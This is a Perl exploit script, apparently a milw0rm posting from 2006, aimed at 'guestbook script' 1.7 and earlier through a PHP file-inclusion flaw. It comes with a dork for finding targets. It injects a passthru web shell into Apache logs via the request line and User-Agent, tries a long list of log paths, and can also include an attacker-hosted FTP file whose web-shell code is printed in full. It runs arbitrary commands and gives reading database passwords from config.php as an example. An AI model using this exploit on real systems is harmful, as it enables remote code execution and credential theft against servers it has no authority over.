#!/usr/bin/perl
use IO::Socket;

print "guestbook script <= 1.7 exploit\r\n";
print "rgod rgod\@autistici.org\r\n";
print "dork: \"powered by guestbook script\"\r\n\r\n";

# short explaination:
# we have this code in nearly all scripts:
# ...
# if (isset ($include_files) and is_array ($include_files)) {
#              reset ($include_files);
#              while(list($key, $val) = each($include_files))
#              {
#
#                  if ($file_content = include_content($val)) {
#                      $$key = $file_content;
#                  } else {
#                      $$key = '<pre>[' . $txt['txt_file_not_found'] . ': ' . $val . ']</pre>';
#                  }
#                  $tpl->register('guest', $key);
#              }
#          }
#...
# here is include_content() function:
#
# function include_content($path)
#          {
#
#              if (is_file($path)) {
#                  ob_start();
#
#                  include($path);
#                  $content = ob_get_contents();
#                  ob_end_clean();
#              }
#
#              if (isset($content)) {
#                  return $content;
#              }
#          }
#
# you can include code from local resources and (on PHP5, because is_file()
# function support ftp wrappers) remote resources, poc:
#
# http://[target]/[path]/index.php?include_files[]=&include_files[1]=/var/log/httpd/access_log
# http://[target]/[path]/index.php?include_files[]=&include_files[1]=ftp://username:pass@192.168.1.3/suntzu.php
#
# you will not see any output, but code inside the included file will be executed.
# You shoul have a "die()" in included file (to prevent the ob_end_clean() call)
# to see some results...
# This exploit supports two actions:
#
# [1] tries to inject some php code in log files and execute it
# [2] tries to include the code from a ftp location


sub main::urlEncode {
    my ($string) = @_;
    $string =~ s/(\W)/"%" . unpack("H2", $1)/ge;
    #$string# =~ tr/.//;
    return $string;
 }

if (@ARGV < 4)
{
print "Usage:\r\n";
print "perl gbs_17_xpl.pl SERVER PATH ACTION[FTP LOCATION] COMMAND\r\n\r\n";
print "SERVER         - Server where Guestbook Script is installed.\r\n";
print "PATH           - Path to Guestbook Script (ex: /gbs/ or just /)\r\n";
print "ACTION         - 1[nothing]\r\n";
print "                 (tries to include apache error.log file)\r\n\r\n";
print "                 2[ftp site with the code to include]\r\n\r\n";
print "COMMAND        - A shell command (\"cat config.php\"\r\n";
print "                 to see database username & password)\r\n\r\n";
print "Example:\r\n";
print "perl gbs_17_xpl.pl 192.168.1.3 /gbs/ 1 cat config.php\r\n";
print "perl gbs_17_xpl.pl 192.168.1.3 /gbs/ 2ftp://username:password\@192.168.1";
print ".3/suntzu.php ls -la\r\n\r\n";
print "Note: to launch action [2] you need this code in suntzu.php :\r\n";
print "<?php\r\n";
print "ob_clean();\r\n";
print "echo 666;\r\n";
print "if (get_magic_quotes_gpc())\r\n";
print "{\$_GET[cmd]=stripslashes(\$_GET[cmd]);}\r\n";
print "passthru(\$_GET[cmd]);\r\n";
print "echo 666;\r\n";
print "die;\r\n";
print "?>\r\n\r\n";
exit();
}

$serv=$ARGV[0];
$path=$ARGV[1];
$ACTION=urlEncode($ARGV[2]);
$cmd=""; for ($i=3; $i<=$#ARGV; $i++) {$cmd.="%20".urlEncode($ARGV[$i]);};
$temp=substr($ACTION,0,1);

if ($temp==2) { #this works with PHP5 and allow_url_fopen=On
  $FTP=substr($ACTION,1,length($ACTION));
  $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>"80")
  or die "[+] Connecting ... Could not connect to host.\n\n";
  print $sock "GET ".$path."index.php?cmd=".$cmd."&include_files[]=&include_files[1]=".$FTP." HTTP/1.1\r\n";
  print $sock "Host: ".$serv."\r\n";
  print $sock "Connection: close\r\n\r\n";
  $out="";
  while ($answer = <$sock>) {
    $out.=$answer;
  }
  close($sock);
  @temp= split /666/,$out,3;
  if ($#temp>1) {print "\r\nExploit succeeded...\r\n".$temp[1];exit();}
         else {print "\r\nExploit failed...\r\n";}

} elsif ($temp==1) { #this works if path to log files is found and u can have access to them
  print "[1] Injecting some code in log files ...\r\n";
  $CODE="<?php ob_clean();echo 666;if (get_magic_quotes_gpc()) {\$_GET[cmd]=stripslashes(\$_GET[cmd]);} passthru(\$_GET[cmd]);echo 666;die;?>";
  $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>"80")
  or die "[+] Connecting ... Could not connect to host.\n\n";
  print $sock "GET ".$path.$CODE." HTTP/1.1\r\n";
  print $sock "User-Agent: ".$CODE."\r\n";
  print $sock "Host: ".$serv."\r\n";
  print $sock "Connection: close\r\n\r\n";
  close($sock);

  # fill with possible locations
  my @paths= (
  "/var/log/httpd/access_log",         #Fedora, default
  "/var/log/httpd/error_log",          #...
  "../apache/logs/error.log",          #Windows
  "../apache/logs/access.log",
  "../../apache/logs/error.log",
  "../../apache/logs/access.log",
  "../../../apache/logs/error.log",
  "../../../apache/logs/access.log",  #and so on... collect some log paths, you will succeed
  "/etc/httpd/logs/acces_log",
  "/etc/httpd/logs/acces.log",
  "/etc/httpd/logs/error_log",
  "/etc/httpd/logs/error.log",
  "/var/www/logs/access_log",
  "/var/www/logs/access.log",
  "/usr/local/apache/logs/access_log",
  "/usr/local/apache/logs/access.log",
  "/var/log/apache/access_log",
  "/var/log/apache/access.log",
  "/var/log/access_log",
  "/var/www/logs/error_log",
  "/var/www/logs/error.log",
  "/usr/local/apache/logs/error_log",
  "/usr/local/apache/logs/error.log",
  "/var/log/apache/error_log",
  "/var/log/apache/error.log",
  "/var/log/access_log",
  "/var/log/error_log"
  );

  for ($i=0; $i<=$#paths; $i++)
  {
    $a = $i + 2;
    print "[".$a."] trying with ".$paths[$i]."\r\n";
    $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>"80")
    or die "[+] Connecting ... Could not connect to host.\n\n";
    print $sock "GET ".$path."index.php?cmd=".$cmd."&include_files[]=&include_files[1]=".urlEncode($paths[$i])." HTTP/1.1\r\n";
    print $sock "Host: ".$serv."\r\n";
    print $sock "Connection: close\r\n\r\n";
    $out='';
    while ($answer = <$sock>) {
    $out.=$answer;
    }
    close($sock);
    @temp= split /666/,$out,3;
    if ($#temp>1) {print "\r\nExploit succeeded...\r\n".$temp[1];exit();}

  }
  #if you are here...
  print "\r\nExploit failed...\r\n";
} else {
  print "No action specified ...\r\n";
}

# milw0rm.com [2006-03-11]
